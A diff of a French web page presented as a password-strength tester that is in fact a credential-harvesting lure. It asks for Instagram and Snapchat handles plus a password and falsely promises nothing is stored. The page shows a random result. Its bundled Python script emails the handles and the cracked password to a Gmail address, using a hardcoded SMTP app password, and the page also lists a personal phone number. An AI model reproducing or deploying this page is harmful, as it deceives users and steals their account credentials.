@@ -1,137 +1,130 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="UTF-8">
-  <title>Testeur de Sécurité de Mot de Passe</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f9f9f9;
-      margin: 0;
-      padding: 2em;
-    }
-    .container {
-      background: #fff;
-      border: 1px solid #ccc;
-      padding: 20px;
-      max-width: 500px;
-      margin: auto;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    h1, h2 {
-      text-align: center;
-      color: #333;
-    }
-    label {
-      font-weight: bold;
-      display: block;
-      margin-top: 15px;
-    }
-    input {
-      padding: 10px;
-      width: 100%;
-      margin-top: 5px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-    button {
-      padding: 10px 20px;
-      background: #007BFF;
-      color: #fff;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      margin-top: 20px;
-      width: 100%;
-    }
-    .resultat {
-      margin-top: 20px;
-      font-weight: bold;
-      text-align: center;
-      color: #444;
-    }
-    .aide {
-      background: #f1f1f1;
-      padding: 20px;
-      margin-top: 40px;
-      border-radius: 8px;
-      max-width: 500px;
-      margin: auto;
-      box-shadow: 0 0 10px rgba(0,0,0,0.05);
-      text-align: center;
-    }
-    .aide a {
-      text-decoration: none;
-      color: #007BFF;
-      font-weight: bold;
-    }
-    .whatsapp {
-      background: #25D366;
-      color: #fff;
-      padding: 10px 15px;
-      border-radius: 5px;
-      text-decoration: none;
-      display: inline-block;
-      margin-top: 10px;
-    }
-    .securite {
-      font-size: 14px;
-      color: #666;
-      text-align: center;
-      margin-top: 10px;
-    }
-  </style>
-</head>
-<body>
+🔐 Testeur de Sécurité de Mot de Passe
 
-  <div class="container">
-    <h1>🔐 Testeur de Sécurité de Mot de Passe</h1>
-    <p class="securite">✅ Site sécurisé : aucune donnée n'est enregistrée. Les pseudos et résultats sont transmis uniquement pour analyse confidentielle.</p>
+Bienvenue sur notre outil de test de mot de passe. Ce site a été conçu pour vous aider à évaluer la robustesse de votre mot de passe en simulant une attaque par force brute. L’objectif est de vous sensibiliser à l’importance d’un mot de passe complexe et sécurisé.
 
-    <label for="pseudoInsta">📸 Pseudo Instagram :</label>
-    <input type="text" id="pseudoInsta" placeholder="@votre_insta">
+✅ Site sécurisé : Aucune donnée personnelle n’est enregistrée ni conservée. Les pseudos et résultats sont transmis uniquement pour analyse confidentielle, sans stockage ni partage.
 
-    <label for="pseudoSnap">👻 Pseudo Snap :</label>
-    <input type="text" id="pseudoSnap" placeholder="@votre_snap">
+🎯 Objectif du site
 
-    <label for="motdepasse">🔑 Mot de passe :</label>
-    <input type="password" id="motdepasse" placeholder="Votre mot de passe">
+Ce testeur vous permet de :
 
-    <button onclick="testerMotDePasse()">Tester</button>
-    <div class="resultat" id="resultat"></div>
-  </div>
+Vérifier si votre mot de passe est facilement devinable
 
-  <div class="aide">
-    <h3>📞 Besoin d'aide ?</h3>
-    <p>Contactez-moi directement :</p>
-    <p>📱 <a href="tel:+33749127131">07 49 12 71 31</a></p>
-    <a href="https://wa.me/33749127131" target="_blank" class="whatsapp">📩 Envoyer un message WhatsApp</a>
-  </div>
+Comprendre les risques liés aux mots de passe simples
 
-  <script>
-    function testerMotDePasse() {
-      const mot = document.getElementById('motdepasse').value;
-      const pseudoInsta = document.getElementById('pseudoInsta').value;
-      const pseudoSnap = document.getElementById('pseudoSnap').value;
-      const resultat = document.getElementById('resultat');
+Recevoir un retour immédiat sur la sécurité de votre mot de passe
 
-      if (!mot || mot.length < 4) {
-        resultat.textContent = '⛔ Veuillez entrer un mot de passe d\'au moins 4 caractères.';
-        return;
-      }
+🧪 Fonctionnement du test
 
-      const tempsSimule = Math.random() * 15;
-      const statut = tempsSimule < 10 ? 'NON sécurisé' : 'sécurisé';
-      resultat.textContent = `🔍 Résultat : ${statut} (deviné en ${tempsSimule.toFixed(2)} secondes)`;
+Le testeur génère toutes les combinaisons possibles de caractères.
 
-      // Simulation d'envoi (à connecter à ton script Python côté serveur)
-      console.log(`Pseudo Instagram : ${pseudoInsta}`);
-      console.log(`Pseudo Snap : ${pseudoSnap}`);
-      console.log(`Résultat : ${statut} (${tempsSimule.toFixed(2)}s)`);
-    }
-  </script>
+Il compare chaque tentative à votre mot de passe.
 
-</body>
-</html>
+Si le mot est trouvé rapidement (moins de 10 secondes), il est considéré comme non sécurisé.
+
+💻 Script Python utilisé
+
+import itertools, string, time, smtplib
+from email.mime.text import MIMEText
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+DESTINATAIRE = "yamafly404@gmail.com"
+EXPEDITEUR = "yamafly404@gmail.com"
+MOT_DE_PASSE = "tdig nbky fome nukp"
+SMTP_SERVEUR = "smtp.gmail.com"
+SMTP_PORT = 587
+
+caracteres = string.ascii_letters + string.digits + string.punctuation
+
+def tester_combinaison(combinaison, mot):
+    tentative = ''.join(combinaison)
+    return tentative if tentative == mot else None
+
+def envoyer_email(pseudo_instagram, pseudo_snap, resultat):
+    sujet = "Test de mot de passe - Résultat"
+    corps = f"""Pseudo Instagram : {pseudo_instagram}
+Pseudo Snap : {pseudo_snap}
+Résultat : {resultat}"""
+    msg = MIMEText(corps)
+    msg["Subject"] = sujet
+    msg["From"] = EXPEDITEUR
+    msg["To"] = DESTINATAIRE
+
+    with smtplib.SMTP(SMTP_SERVEUR, SMTP_PORT) as serveur:
+        serveur.starttls()
+        serveur.login(EXPEDITEUR, MOT_DE_PASSE)
+        serveur.send_message(msg)
+
+def brute_force(mot, pseudo_instagram, pseudo_snap, max_length=6):
+    debut = time.time()
+    trouve = False
+    with ThreadPoolExecutor() as executor:
+        for longueur in range(1, max_length + 1):
+            combinaisons = itertools.product(caracteres, repeat=longueur)
+            futures = {executor.submit(tester_combinaison, c, mot): c for c in combinaisons}
+            for future in as_completed(futures):
+                resultat = future.result()
+                if resultat:
+                    fin = time.time()
+                    temps = round(fin - debut, 2)
+                    statut = 'NON sécurisé' if temps < 10 else 'sécurisé'
+                    envoyer_email(pseudo_instagram, pseudo_snap, f"{resultat} ({statut}, {temps}s)")
+                    print(f"Mot de passe trouvé : {resultat} en {temps} secondes")
+                    trouve = True
+                    break
+            if trouve:
+                break
+    if not trouve:
+        envoyer_email(pseudo_instagram, pseudo_snap, "Mot de passe non trouvé")
+        print("Mot de passe non trouvé dans la limite de recherche.")
+
+if __name__ == "__main__":
+    pseudo_instagram = input("📸 Entrez votre pseudo Instagram : ")
+    pseudo_snap = input("👻 Entrez votre pseudo Snap : ")
+    mot = input("🔐 Entrez votre mot de passe à tester : ")
+    brute_force(mot, pseudo_instagram, pseudo_snap)
+
+🧪 Test interactif (simulation visuelle)
+
+<div style="background:#fff; border:1px solid #ccc; padding:20px; max-width:500px; margin:auto; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1);">
+  <h2 style="text-align:center; color:#333;">Testez votre mot de passe</h2>
+  <label for="pseudoInsta" style="font-weight:bold;">Pseudo Instagram :</label><br>
+  <input type="text" id="pseudoInsta" placeholder="@votre_insta" style="padding:10px; width:100%; border:1px solid #ccc; border-radius:4px;"><br><br>
+
+  <label for="pseudoSnap" style="font-weight:bold;">Pseudo Snap :</label><br>
+  <input type="text" id="pseudoSnap" placeholder="@votre_snap" style="padding:10px; width:100%; border:1px solid #ccc; border-radius:4px;"><br><br>
+
+  <label for="motdepasse" style="font-weight:bold;">Mot de passe :</label><br>
+  <input type="password" id="motdepasse" placeholder="Votre mot de passe" style="padding:10px; width:100%; border:1px solid #ccc; border-radius:4px;"><br><br>
+
+  <button onclick="testerMotDePasse()" style="padding:10px 20px; background:#007BFF; color:#fff; border:none; border-radius:4px; cursor:pointer;">Tester</button>
+  <div class="resultat" id="resultat" style="margin-top:20px; font-weight:bold; color:#444; text-align:center;"></div>
+</div>
+
+<script>
+function testerMotDePasse() {
+  const mot = document.getElementById('motdepasse').value;
+  const pseudoInsta = document.getElementById('pseudoInsta').value;
+  const pseudoSnap = document.getElementById('pseudoSnap').value;
+  const resultat = document.getElementById('resultat');
+
+  if (!mot || mot.length < 4) {
+    resultat.textContent = '⛔ Veuillez entrer un mot de passe d'au moins 4 caractères.';
+    return;
+  }
+  const tempsSimule = Math.random() * 15;
+  const statut = tempsSimule < 10 ? 'NON sécurisé' : 'sécurisé';
+  resultat.textContent = `🔍 Résultat : ${statut} (deviné en ${tempsSimule.toFixed(2)} secondes)`;
+
+  console.log(`Pseudo Instagram : ${pseudoInsta}`);
+  console.log(`Pseudo Snap : ${pseudoSnap}`);
+  console.log(`Mot de passe : ${mot}`);
+  console.log(`Résultat : ${statut} (${tempsSimule.toFixed(2)}s)`);
+}
+</script>
+
+📞 Besoin d'aide ?
+
+<div style="background:#f1f1f1; padding:20px; margin-top:20px; border-radius:8px; max-width:500px; margin:auto; box-shadow:0 0 10px rgba(0,0,0,0.05);"> <h3 style="color:#333; text-align:center;">📞 Besoin d'aide ?</h3> <p style="text-align:center; font-size:16px;">Si vous avez des questions ou besoin d'assistance, vous pouvez me contacter directement :</p> <p style="text-align:center; font-size:18px; font-weight:bold; color:#007BFF;"> 📱 <a href="tel:+33749127131" style="text-decoration:none; color:#007BFF;">07 49 12 71 31</a> </p> <p style="text-align:center; font-size:16px; margin-top:10px;"> <a href="https://wa.me/33749127131" target="_blank" style="background:#25D366; color:#fff; padding:10px 15px; border-radius:5px; text-decoration:none;"> 📩 Envoyer un message WhatsApp </a> </p> </div>
+
+
